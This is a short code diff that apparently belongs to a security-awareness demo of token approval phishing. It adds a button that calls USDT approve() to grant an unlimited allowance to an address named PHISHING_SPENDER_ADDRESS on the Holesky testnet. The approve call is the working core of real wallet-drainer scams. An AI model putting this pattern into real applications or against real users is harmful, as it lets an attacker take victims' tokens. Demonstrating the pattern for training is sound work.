@@ -1,0 +1,32 @@
+<button
+  onClick={handleApproveUSDT}
+  className="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600 transition-colors disabled:bg-red-300"
+  disabled={isExecute}
+>
+  {t.usdtApprovalPhishing.approveButton}
+</button>
+
+const USDT_CONTRACT_ADDRESS = "0x87350147a24099Bf1e7E677576f01C1415857C75";
+const PHISHING_SPENDER_ADDRESS = "0x0000000066663456789012345678901234560000";
+const MAX_UINT256 = BigInt(Math.pow(2, 256)) - 1n;
+
+const tx = await writeContractAsync({
+  address: USDT_CONTRACT_ADDRESS,
+  abi: [
+    {
+      name: "approve",
+      type: "function",
+      stateMutability: "nonpayable",
+      inputs: [
+        { name: "spender", type: "address" },
+        { name: "amount", type: "uint256" },
+      ],
+      outputs: [{ type: "bool" }],
+    },
+  ],
+  functionName: "approve",
+  args: [PHISHING_SPENDER_ADDRESS, MAX_UINT256],
+  chainId: holesky.id,
+});
+
+
